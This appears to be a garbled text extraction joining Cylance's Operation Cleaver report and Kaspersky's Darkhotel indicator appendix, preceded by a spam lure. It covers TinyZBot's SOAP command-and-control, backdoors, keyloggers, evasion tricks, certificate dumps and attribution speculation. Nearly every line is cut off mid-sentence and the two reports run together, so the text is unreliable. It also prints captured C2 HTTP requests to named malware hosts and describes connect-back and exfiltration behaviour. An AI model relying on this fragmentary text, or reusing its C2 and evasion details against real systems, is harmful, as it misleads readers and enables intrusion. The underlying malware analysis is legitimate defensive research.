Buy Viagra150 mg x 50 tablets for only $ 124.99 !
No Prescription required . Viagra dosages : 150 , 100 , 25 mg . Fast
Worldwide Delivery .
See the attachment movie .
Free bonus trip .
The files being exfiltrated are added to the email as attachments .
As part of TinyZBot ’s command and control protocol , files can be exfiltrated over SOAP to the
Persistence is the means of maintaining access to a compromised network . There are limitless
Extract saved passwords for Internet Explorer
Install as a service
The command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP .
Potential reasons for using SOAP are :
As part of SOAP communications , a URI is specified . This is internal to the sub - protocol , and does
Since the first version of the SOAP - based command and control protocol was implemented ,
For the command and control examples below , red text represents TCP data sent from the
User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; MS Web Services Client Protocol 2.0.50727.1433 )
Content - Type : text / xml ; charset = utf-8
Host : microsoftactiveservices(dot)com
Content - Length : 291
Expect : 100-continue
Connection : Keep - Alive
Cache - Control : private , max - age=0
Content - Type : text / xml ; charset = utf-8
Server : Microsoft - IIS/7.5
X - AspNet - Version : 2.0.50727
X - Powered - By : ASP.NET
Date : Mon , 06 Oct 2014 13:36:47 GMT
Content - Length : 392
This is the first query done by a running TinyZBot instance , and needs to be done shortly before
Commands , updates and files to drop and execute are stored as files on the SOAP server , and
User - Agent : Mozilla/4.0 2
Content - Type : text / xml ; charset = utf-8
Host : microsoftactiveservices(dot)com
Content - Length : 425
Expect : 100-continue
Content - Type : text / xml ; charset = utf-8
Server : Microsoft - IIS/7.5 X - AspNet - Version : 2.0.50727
X - Powered - By : ASP.NET Date : Mon , 06 Oct 2014 13:36:47 GMT
Content - Length : 1474            86
In order to download the file and parse for commands to execute , the TinyZBot must request the
Content - Type : text / xml ; charset = utf-8
Host : microsoftactiveservices(dot)com
Content - Length : 478
Expect : 100-continue
Cache - Control : private , max - age=0
Content - Type : text / xml ; charset = utf-8
Server : Microsoft - IIS/7.5
X - AspNet - Version : 2.0.50727
X - Powered - By : ASP.NET Date : Mon , 06 Oct 2014 13:36:47 GMT
Content - Length : 652
The command file downloaded in this example is as follows :
The first line is a timestamp of the command . The TinyZBot command parser ignores it . The
The following is a list of supported commands that TinyZBot responds to :
Commands such as GETINFO are often run on newly infected systems , as they decide whether
Deception
Many of the images identified were of the popular Lebanese singer and actress Haifa Wehbe . The
History
The earliest known version on TinyZBot was compiled on January 27 , 2013 . This early version
The initial version did not provide any means of receiving commands and was obfuscated with
The next version was compiled on April 24 , 2013 . This version starts to look more like an
The next day , April 25 , 2013 , a new version was compiled which allowed for self - deletion .
On May 14 , 2013 , we noticed a change which assisted in the identification of active targets .
The AppUsageId ( at this point named AppType ) was an identifier used by this organization in
On June 17 , 2013 , there was an addition that allowed for the loading of configuration data from
History ( cont . )
We do not see a new version of TinyZBot until June 7 , 2014 . There are quite a few notable
A new string encryption class is added , but the code was copied and pasted from a Microsoft
On June 17 , 2014 , we see2the first instance of Binder_1 , which is aptly named , as it is a binder .
The legitimate application used in this version of Binder_1 was compiled on August 22 , 2013 ,
Edge . The TinyZBot included was the version compiled on June 7 , 2014 .
The version compiled on June 23 , 2014 , added functionality which allowed screenshots of the
On August 2 , 2014 , we see another version without SmartAssembly obfuscation . A bug fix is made
Three items were compiled on August 18 , 2014 . Two of them are TinyZBot binaries , which contain
From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the
Affairs in the Persian Gulf , and a major airline holding company in UAE . These versions of
Binder_1 instance , which also dropped Easy_resume_creator .
History ( cont . )
There also seem to be improved software engineering practices in many locations . FTP upload
On August 25 , 2014 , the version compiled on August 18 was submitted to VirusTotal in a ZIP
On September 9 , 2014 , a ZIP file containing TinyZBot and a configuration targeting a major US
From September 11 through September 17 , 2014 , some TinyZBot components were compiled ,
When executed , the user is prompted to enter personal information , and at the end is given a
Interesting Notes
Command and Control Servers
Backdoors
Multiple backdoors were used by this organization . These are scripts or applications that allowed
Attribution section , as well as ASPX backdoors used by Nesha . A PHP shell was also observed ,
An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered from
Figure 24 : The ASPX backdoor named “ Zh0uSh3ll ” , allowing SQL queries .
Figure 25 : The ASPX backdoor named “ Zh0uSh3ll ” , allowing file
This organization utilized backdoors which masqueraded as varying versions of Notepad . They
The components are as follows :
The purpose of PVZ - In 2
Disposition HTTP header , making the traffic easy to pass over as benign .
When a command is received from the server , the results are stored in a central location on disk
The debug file path for PVZ - In is :
Much like PVZ - In , this command and control channel communicates with the Content - Disposition
Data uploaded is often compressed , which can make it more difficult to detect the exfiltration of
The debug file path for PVZ - Out is :
The debug file path for SYN Flooder is :
Logger Module
Logger Module observes the user ’s actions and records them to a file . The recorded actions include
The following command and control servers for Logger Module have been observed :
The command and control still supports upgrading , downloading , and executing of applications , as
We have seen wndTest communicate with the following servers :
Csext
Csext is a backdoor application developed in C # which runs as a service . Its primary functionality
This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net ( a
Relations ) with XORed communication using the HTTP protocol on TCP port 443 . This zhCat
Csext also has email functionality similar to TinyZBot . This email functionality is used to exfiltrate
We have seen Csext configured to communicate with the following servers :
If after reviewing the Indicators of Compromise ( IOC ) listed in Appendix A , you believe your
Cylance can mitigate Operation Cleaver ’s impact to your organization , please contact us directly .
Iran in 2014 can probably be best described as galvanizing . They have long been an “ enemy ” of
Iran ’s cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard
With the deadlines around0
France , Germany , Russia and China .
The inner workings of the Iranian government remain largely a mystery to the western world .
However , Iran ’s control over its people and the private businesses birthed inside has been well
Even the US Treasury has documented an extensive fronting of companies in its report of Execution
The history of Iran controlling the usage of the Internet and the very Internet on - ramps into Iran is
Speculation : The Why ( cont . )
Involvement with North Korean
Operation Cleaver ’s intense focus on critical infrastructure companies , especially in South Korea ,
Korea , which allows for collaboration on a variety of efforts including IT and security.6
Cyber Moving to Physical
Operation Cleaver ’s carefully selected targets like the oil and gas industry , energy and utility
University Recruitment
University student recruitment was hinted at within Operation Cleaver and is consistent with
Iran ’s reported history of active warrior recruitment in the educational space.15
Overall , there are many reasons that Iran may be pursuing the targets they did in Operation
Cleaver . While we may never truly know , it is important to consider all the above and more when
After tracking the Operation Cleaver team for over two years , we ’re led to the inexorable
As security experts in Critical Infrastructure and Key Resources ( CIKR ) , Industrial Control Systems
We have worked with countless customers and vendors throughout the years to notify them of
Unfortunately , many critical infrastructure organizations are unable to secure their complex
If Operation Cleaver does n’t get the world to wake up to what is happening in the silent world of
Challenge your trusted advisors . Challenge your security vendors . Demand better technology
We hope that by exposing the Operation Cleaver team to the world , current global critical
In the face of growing and evolving threats , traditional cyber protection technologies are now
Something that does n’t rely on a trust model or care about hash lookups . Something with a brain .
Jeff Moss - Co - Chair of the DHS Community Resiliency Task Force
Cylance has eschewed the old foundations that existing cybersecurity products are built upon .
Instead , we ’ve based our approach on mathematics , machine learning , and data science . This
Leveraging algorithmic risk modeling , CylancePROTECT protects endpoints from everyday viruses ,
Existing reactive solutions rely on a constant stream of signature updates for threat detection , which
As Richard Stiennon , Chief Research Analyst at IT - Harvest , put it , “ Many vendors are trying to solve
Interested in seeing what CylancePROTECT can do for your organization ? Contact us !
Cylance is one of the fastest growing cybersecurity technology firms in the US . Cylance ’s flagship product
Cylance board of advisors includes former high - ranking officials from the DHS , the FBI , CIA , and executive titans of
The technology is founded on the principle that to fix the industry , you must start from scratch with
While every other endpoint security product must collect a sample , analyze , and write a signature
Features and Benefits of2CylancePROTECT :
For a demo of CylancePROTECT , contact a Cylance expert today !
Figure 26 : Cylance products detect and stop all the malware used in
Operation Cleaver , even though the vast majority of the samples are
Cylance ’s Professional Services team is available to assist companies affected by this campaign .
Cylance is providing consulting to companies that may have been targeted by these advanced
Cylance has two tailored offerings for clients affected by this campaign . The first one includes
Key Resources ( CIKR ) vertical . The second offering ’s focus is to deploy our proprietary tools and
Option 1 : ICS Incident Response & APT Detection and Mitigation
Option 2 : Detection , Remediation , & Mitigation
For more information on how the Cylance Professional Services team can assess and respond to
Uncover previously undiscovered
Check the integrity of your
Dig into who , what , where , and
Get expert help that addresses YOUR security needs .
Brian Wallace
Brian is a Sr . Security Researcher for Cylance who joined shortly after the company was established .
He is best known for his avid botnet research ( often going by “ botnet_hunter ” ) and for his novel
Brian actively develops techniques to combat cyber oppositions in positions where resources and
Brian ’s botnet research covers a wide range of topics , from using graph analysis to estimate
Stuart McClure
Stuart is founder , CEO / President and Chairman of Cylance . Widely recognized for his extensive and
October of 1999 which sold to McAfee in 2004 .
Today , McClure is CEO of Cylance , a disruptive and innovative startup applying math to the problem
Cylance Team
Cylance employees work passionately and tirelessly every day to achieve one goal : Protect the
The Operation Cleaver logo , created by Cylance specifically for this report , was inspired by the
Army of the Guardians of the                                     Operation Cleaver
Islamic Republic ( IRGC )
Several of the visual elements present in the IRGC
The striking visual elements that make up the logo        logo have been carried over to the Operation Cleaver
Indicators of Compromise ( IOC )
This Appendix details the IOCs discovered in the investigation of Operation Cleaver .
Domains
Email Addresses Used for Domain Registration
Email Addresses Used for Exfiltration
Mutexes
Adobe Report Service
Bmgr
Dynamic Mutexes
These mutexes are used with the process ID of the malware as a suffix :
Installed Services Names
Network Connectivity Manager
Service1
Pcapins
Adobe Report Service
Samples ( MD5 )
Listed below are both the MD5 and SHA-256 hashes for samples related to Operation Cleaver .
Samples ( MD5 ) cont .
Samples ( MD5 ) cont .
Samples ( SHA-256 )
Samples ( SHA-256 ) cont .
Samples ( SHA-256 ) cont .
Public / Private Key Fingerprints
Darkhotel
Indicators
For more information , contact intelreports@kaspersky.com
Version 1.0
November , 2014
Global Research and Analysis Team
Contents
Appendix A - related md5s ..................................................................................... 3
Downloaders , injectors , infostealers ............................................................... 3
Appendix B. Fully Qualified Domain Names , Command and Control ................ 12
Appendix C. Code - signing certificates ................................................................ 17
Appendix D. Malcode Technical Notes ............................................................... 58
Small Downloader .......................................................................................... 58
Technical Details ....................................................................................... 58
Information Stealer ......................................................................................... 60
Technical Details ....................................................................................... 60
Trojan . Win32.Karba.e ..................................................................................... 64
Technical Notes ......................................................................................... 64
Selective Infector ............................................................................................ 67
Technical Notes ......................................................................................... 67
Trojan - Dropper & Injector ( infected legitimate files ) ..................................... 67
Technical Notes ......................................................................................... 67
Enhanced Keyloggers and Development ...................................................... 68
Technical Notes ......................................................................................... 68
Keylogger Code ............................................................................................... 68
Appendix E. Parallel and Previous Research ...................................................... 73
Appendix A - related md5s
Downloaders , injectors , infostealers
Example md5s of files detected with Kaspersky ’s Virus . Win32.Pioneer.dx and
Symantec ’s Infostealer . Nemim!inf :
Appendix B. Fully Qualified Domain Names ,
Command and Control
Appendix C. Code - signing certificates
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2576597 ( 0x2750d5 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
Validity
Not Before : Jun 2 03:55:56 2009 GMT
Not After : Jun 2 03:55:56 2011 GMT
Subject : C = MY , O = JARING Communications Sdn . Bhd . ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Policy : 2.16.458.1.1
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2657623 ( 0x288d57 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
Validity
Not Before : Sep 29 06:46:10 2009 GMT
Not After : Sep 29 06:46:10 2011 GMT
Subject : O = MARDI , CN = anjungnet.mardi.gov.my , ST = SERDANG
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Policy : 2.16.458.1.1
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number :
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = BE , O = Cybertrust , OU = Educational CA ,
Validity
Not Before : Jan 16 08:55:33 2009 GMT
Not After : Jan 16 08:55:33 2012 GMT
Subject : C = GB , ST = England , L = London , O = London Metropolitan
University , OU = ISS , CN = skillsforge.londonmet.ac.uk
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Digital Signature , Key Encipherment
B:76:77:50:E1
F5:28:E1
Full Name :
Authority Information Access :
Netscape Cert Type :
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 19771 ( 0x4d3b )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Anthem Inc , OU = Ecommerce , CN = Anthem Inc
Certificate Authority
Validity
Not Before : Apr 22 18:15:10 2009 GMT
Not After : Apr 22 18:15:10 2010 GMT
Subject : C = US , ST = Indiana , L = Indianapolis , O = Anthem
Insurance Company Inc , OU = EBusiness , CN = ahi.anthem.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Key Encipherment
Solutions , Inc./CN = GTE
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 1707608080 ( 0x65c80810 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = TW , O = TAIWANCA .
Validity
Not Before : Jul 2 06:34:05 2010 GMT
Not After : Jul 17 15:59:59 2011 GMT
Subject : C = TW , ST = Taipei , L = Taipei , O = TRADEVAN ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Full Name :
Policy : 2.16.158.3.1.8.5
User Notice :
Explicit Text : Restriction = 3.2.1.1
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 19771 ( 0x4d3b )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Anthem Inc , OU = Ecommerce , CN = Anthem Inc
Certificate Authority
Validity
Not Before : Apr 22 18:15:10 2009 GMT
Not After : Apr 22 18:15:10 2010 GMT
Subject : C = US , ST = Indiana , L = Indianapolis , O = Anthem
Insurance Company Inc , OU = EBusiness , CN = ahi.anthem.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Key Encipherment
Solutions , Inc./CN = GTE
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 820 ( 0x334 )
Signature Algorithm : md5WithRSAEncryption
Issuer : C = US , O = Equifax Secure Inc. , CN = Equifax Secure
Validity
Not Before : Feb 28 05:56:46 2005 GMT
Not After : Mar 31 05:56:46 2007 GMT
Subject : C = IS , O = secure.hotelreykjavik.is ,
Validated StarterSSL(TM ) , CN = secure.hotelreykjavik.is
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Full Name :
A:47:7C:4C : A1
Signature Algorithm : md5WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number :
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Thawte , Inc. , CN = Thawte Code Signing CA G2
Validity
Not Before : Jul 19 00:00:00 2013 GMT
Not After : Jul 16 23:59:59 2014 GMT
Subject : C = CN , ST = Henan , L = Xuchang , O = Xuchang Hongguang
Technology Co.,Ltd . , CN = Xuchang Hongguang Technology
Co.,Ltd .
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Full Name :
Code Signing , Microsoft Commercial Code Signing
Authority Information Access :
Netscape Cert Type :
Object Signing
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2786200 ( 0x2a8398 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
Validity
Not Before : Mar 29 03:40:07 2010 GMT
Not After : Mar 29 03:40:07 2012 GMT
Subject : C = MY , O = Digicert Sdn Bhd , OU = CA Operation ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Policy : 2.16.458.1.1
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:71:31:72:c9
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 13 19:00:51 2009 GMT
Not After : Feb 13 19:00:51 2011 GMT
Subject : CN = inpack.syniverse.com ,
L = Tampa , O = Syniverse Technologies Inc. , OU = Crossroads ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Netscape Cert Type :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Full Name :
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1d:91:a4:6e:5b
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = BE , O = Cybertrust , OU = Educational CA ,
Validity
Not Before : Nov 12 16:59:48 2008 GMT
Not After : Nov 12 16:59:48 2011 GMT
Subject : C = GB , ST = Norfolk , L = Norwich , O = City College
Norwich , OU = I.T. Services , CN = stfmail.ccn.ac.uk
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Digital Signature , Key Encipherment
B:76:77:50:E1
E5:F2:F8
Full Name :
Authority Information Access :
Netscape Cert Type :
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:71:6f:21:66
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 13 19:59:00 2009 GMT
Not After : Feb 13 19:59:00 2011 GMT
Subject : CN = agreement.syniverse.com ,
L = Tampa , O = Syniverse Technologies Inc. , OU = Crossroads ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Netscape Cert Type :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Full Name :
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2786749 ( 0x2a85bd )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
Validity
Not Before : Mar 29 04:26:21 2010 GMT
Not After : Mar 29 04:26:21 2012 GMT
Subject : C = MY , O = Digicert Sdn . Bhd . , CN = mcrs2.digicert .
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Policy : 2.16.458.1.1
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 21665 ( 0x54a1 )
Signature Algorithm : md5WithRSAEncryption
Issuer : C = US , O = Equifax Secure Inc. , CN = Equifax Secure
Validity
Not Before : Jun 14 15:26:42 2006 GMT
Not After : Jul 14 15:26:42 2008 GMT
Subject : C = US , O = www.gccustomservices.com ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Full Name :
A:47:7C:4C : A1
Signature Algorithm : md5WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 27455 ( 0x6b3f )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = DE , O = TSystems
Enterprise Services GmbH , OU = Trust Center Deutsche
Telekom , CN = Deutsche Telekom CA 5
Validity
Not Before : Oct 20 06:55:03 2008 GMT
Not After : Oct 25 06:55:03 2009 GMT
Subject : O = AIC GmbH , OU = AIC Certificate Service C06 ,
L = Sindelfingen , ST = BAW , C = DE , CN = www.kuechentraum24.de
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Digital Signature , Key Encipherment
Policy : 1.3.6.1.4.1.7879.13.2
Full Name :
Pub_Cert / ServPass / DwnloadCRL.crl?issuer _
Full Name :
Telekom , o = TSystems%20Enterprise%20Services%20
Signature Algorithm : sha1WithRSAEncryption
Q / nFeVxD9Fgib8TbwdKpRTEzHtpz2nta6i6A6zCA / FgeHomyFRv8vPJFTf8CAwEA
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 27585 ( 0x6bc1 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Anthem Inc , OU = Ecommerce , CN = Anthem Inc
Certificate Authority
Validity
Not Before : Jan 13 19:01:43 2010 GMT
Not After : Jan 13 19:01:43 2011 GMT
Subject : C = US , ST = Indiana , L = Indianapolis , O = Anthem
Companies Inc , OU = AIT , CN = www18.anthem.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Key Encipherment
Solutions , Inc./CN = GTE
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2176345 ( 0x213559 )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
Validity
Not Before : Dec 17 08:55:45 2008 GMT
Not After : Dec 17 08:55:45 2010 GMT
Subject : C = MY , O = JARING Communications Sdn . Bhd . ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Policy : 2.16.458.1.1
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2674380 ( 0x28cecc )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
Validity
Not Before : Dec 7 08:02:08 2009 GMT
Not After : Dec 7 08:02:08 2010 GMT
Subject : C = MY , O = BANK NEGARA MALAYSIA , OU = BANK NEGARA
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Policy : 2.16.458.1.1
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:80:95:bf:76
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 16 18:44:52 2009 GMT
Not After : Feb 16 18:44:52 2011 GMT
Subject : CN = ambermms.syniverse.com ,
L = Tampa , O = Syniverse Technologies Inc. , OU = Crossroads ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Netscape Cert Type :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Full Name :
Signature Algorithm : sha1WithRSAEncryption
Uxi / zOSzf / xrg7E1BMHu6kLVv8JX / xijzlKkLJIqb7aYYkWYlnaQgDK5jP6TqIbp
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 71:a9:60:1f:3d:87:46:30:9b : bf:5e : cf:28:24:8
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = VeriSign , Inc. , OU = VeriSign Trust Network ,
Validity
Not Before : Oct 26 00:00:00 2009 GMT
Not After : Oct 26 23:59:59 2010 GMT
Subject : C = US , ST = Missouri , L = Bridgeton , O = Vantage Credit
Union , OU = IT Department , CN = secure2.eecu.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Digital Signature , Key Encipherment
Full Name :
Authority Information Access :
Policy : 2.16.840.1.113733.1.7.23.3
Signature Algorithm : sha1WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number :
Signature Algorithm : md5WithRSAEncryption
Issuer : CN = Root Agency
Validity
Not Before : Jun 9 10:31:21 2009 GMT
Not After : Dec 31 23:59:59 2039 GMT
Subject : CN = Microsoft
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
O .. a! .. dc .. 0.1.0 ... U .... Root Agency ... 7l ... d ...... \5 .
Signature Algorithm : md5WithRSAEncryption
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:71:31:72:c9
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 13 19:00:51 2009 GMT
Not After : Feb 13 19:00:51 2011 GMT
Subject : CN = inpack.syniverse.com ,
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
Modulus :
Exponent : 65537 ( 0x10001 )
Netscape Cert Type :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Full Name :
Signature Algorithm : sha1WithRSAEncryption
Appendix D. Malcode Technical Notes
Small Downloader
Filename       MD5                                  Link Time ( UTC )            Linker
Technical Details
To ensure only single instance of the module is running , the module verifies if
The module implements a method to resist running in virtual environment . It gets
If any of these strings is found , the module terminates .
After that , there is a hardcoded value of 10 , which delays further execution of the
The next is step is to check if current directory has a file named « U » . If not , the
After all , if the module is ready and allowed to communicate with C&C server it
User­Agent : Mozilla/4.0 ( compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;
Media Center PC 6.0 )
Host : autolace.twilightparadox.com
Connection : Keep­Alive
Cache­Control : no­cache
The server response should contain « DEXT87 » string which is used to rec-
Content­Length : 17
If the C&C IP address is valid , the module issues another HTTP request :
User­Agent : Mozilla/4.0 ( compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;
Host : autolace.twilightparadox.com
Connection : Keep­Alive
Cache­Control : no­cache
The server response can be one of the following :
Where < DATASIZE > is a decimal integer that represents length of < DATA >
Information Stealer
Filename       MD5                                   Link Time ( UTC )            Linker
This module is relatively large ( 455Kb ) and comes as a part of WinRar SFX file
Technical Details
From the very beginning this module checks if « bdagent.exe » process is running
If it is running , it uses simple AV heuristics evasion technique . The code starts a
Next the module makes sure only one instance of current code is running by
If the module reveals that current System default codepage is 0412 ( Korean ) it
There is one interesting specifics in Microsoft IntelliForms which reveals attack-
Intelliforms offers about the place where given login / password should be used
The list of targeted services includes some local services specifically popular in :
The module uses several simple XOR­based algorithms to encrypt embedded
The module works with all Firefox versions prior to Mozilla Firefox 12.0 . Depend-
When stealing secrets from Firefox and Chrome it uses built­in SQLite library code .
The module is linked with SQLite version 3.7.5 release candidate 2 , release
After stealing secrets from local system the malware executes some kind of
The module uploads all collected information to one of the following URLs via
It ’s the first time we see .pn domain used in malware . This top level country code
Pitcairn Islands is only 56 people . An official .pn domain costs $ 100/year from
The malware uses fixed User­Agent string :
Mozilla/4.0 ( compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;
The data is uploaded as a POST request binary in the following format :
Info;
Sys@User : MYCOMPUTER@MyUser ( 0850 )
C P U : Intel(R ) Core(TM ) i3­1667U CPU @ 1600GHz
System OS : Microsoft Windows XP ( Service Pack 3 )
Net card : 192.168.0.2 ( 133773311337 )
If the server reply contains a keyword « minmei » it continues sending additional in-
Trojan . Win32.Karba.e
Filename        MD5                                  Link Time ( UTC )           Linker
Technical Notes
The trojan iterates through running processes and looks for security software
Process Name                AV Identifier                 Company Name , Country
The malware uses a trick to evade running on a VMware . First , it checks if cur-
I / O specific to VMWare virtual machine ( the VMware hypervisor port : 0x5658;
Next the malware submits collected information to the C&C server using HTTP
Selective Infector
Technical Notes
Trojan - Dropper & Injector ( infected legitimate files )
Technical Notes
A large number of files are detected by Kaspersky Lab scanners as Virus . Win32 .
Darkhotel component . All of these infected files drop a 63 kb self injecting compo-
Filename       MD5                                   Link Time ( UTC )           Linker
This malware is 63 kb in size . It is bound to a variety of other software packages
This smaller code section maintains similar functionality to the “ worm ” compo-
Host package files detected as “ Virus . Win32.Pioneer.dx ” are infected legitimate
Enhanced Keyloggers and Development
Technical Notes
It is signed with the familiar “                                     ” digital certificate .
Signed by                         certificate .
This sample is started by code running within svchost.exe on WinXP SP3 . It drops
Note ­일반 ­means “ General ” in Korean
The dropper above maintains , drops and installs this kernel mode keylogger :
Likely , it was developed as a part of a mid­to­late 2009 project :
Keylogger Code
This driver package is built to look like a legitimate low level Microsoft system
When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and
And here , the ports are directly being read with READ_PORT_UCHAR(0x64 ) and
It buffers , then communicates the data to the running user mode component .
This component then encrypts and writes the retrieved values ondisk to a ran-
Here is debug output demonstrating this component ’s data retrieval when the
Current ISR , HighAddress = 0xf718 , LowAddress = 0xf330 , Flag = 0xee oldCR4 =
These debug messages and code style are duplicates of what chpie posted in the
This keylogger module encrypts and stores gathered data in a log file , as men-
Here is the commented RC4 encryption code :
Appendix E. Parallel and Previous Research
Getting “ Left of Boom ” : How ThreatConnect Enables Proactive Cybersecurity ,
Nevermind Nenim ’s hidden agenda ­we still caught it , Microsoft MMPC , April 2013
Dec 21 CVE­2009­0556 ( corrected CVE ) Christmas Messages.pps with stolen cert from
Syniverse from nicholas.bennett53@hotmail.com , Contagio , December 2010
Apr 26 CVE­2010­0188 PDF North Korea Policy Piece from ( fake ) walterkeats@
Mar 27 CVE­2010­0806 IE 0­day Dozens missing after ship sinks near North Korea
